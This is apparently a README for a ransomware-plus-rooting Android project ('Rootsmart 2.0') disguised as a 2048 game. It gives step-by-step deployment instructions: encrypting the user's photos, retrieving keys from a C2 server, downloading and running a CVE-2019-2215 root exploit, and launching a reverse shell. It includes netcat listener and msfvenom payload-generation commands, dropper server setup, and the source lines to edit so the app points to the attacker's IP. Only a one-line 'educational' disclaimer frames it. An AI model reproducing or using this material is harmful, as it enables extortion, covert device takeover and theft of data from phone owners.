# Rootsmart 2.0 w/ cve-2019-2215 + Ransomware

Disclaimer:
This project is solely for educational purposes. This project utilise code from [rkshrksh/2048-Game](https://github.com/rkshrksh/2048-Game).

Attack Vector:

1. Install, run the application and grant permissions
2. Ransomware will AES encrypt all files in /sdcard/Pictures
3. Each file will be encrypted with a random generated key
4. Keys will be stored in /sdcard/keys.json where each key:value pair is filepath:key
5. GET HTTP to C2 server /get_mk to retrieve MasterKey and VictimID in response body
6. MasterKey will encrypt keys.json, VictimID will be stored in /sdcard/victimID.txt
7. The application will download shells.zip and unzip the contents
8. Execute cve-2019-2215 binary from the unzipped contents
9. A root shell process will be spawn and will run install.sh from the unzipped contents
10. Install.sh will execute rs.elf from the unzipped contents to send a reverse connection to attack server


---

## C2 (Command & Control) - Setup
For this test, ensure that the victim phone and the C2 server are in the same subnet (otherwise host C2 in public internet).

Reverse Shell Server
```bash
nc -lvnp 1337 # Ideally this should be the same IP as the dropper server
```

Dropper Server
```bash
# Generate rs.elf payload
msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Attacker Port> -f elf > rs.elf

# Better to run flask on Windows if WSL don't port forward localhost traffic to Windows Host
cd dropper
python3 -m venv venv # Create venv

# Activate venv
. venv/bin/activate # Linux
venv\Scripts\activate.bat # Windows
pip install -r requirements.txt --upgrade pip # Make sure host shell is root/Administrator

# Run C2 server
python3 dropper_server.py # WSL
python dropper_server.py # Windows
```

shells.zip in /dropper
1. Go to dropper/cve-2019-2215 folder
2. After creating rs.elf, zip rs.elf + cve-2019-2215, install.sh
3. Rename zip file to shells.zip
4. Move shells.zip to /dropper

## Modify the following before compiling APK

Java Classes
```java
// File : 2048-Game/app/src/main/java/aarkay/a2048game/Temproot.java
// Change IP and port according to dropper server IP and port
String URL = "http://192.168.157.73:8080/process_command"; // Line 20

// File : 2048-Game/app/src/main/java/aarkay/a2048game/Encrypt.java
// Change IP and port according to dropper server IP and port
String URL = "http://192.168.157.73:8080/get_mk"; // Line 45
```





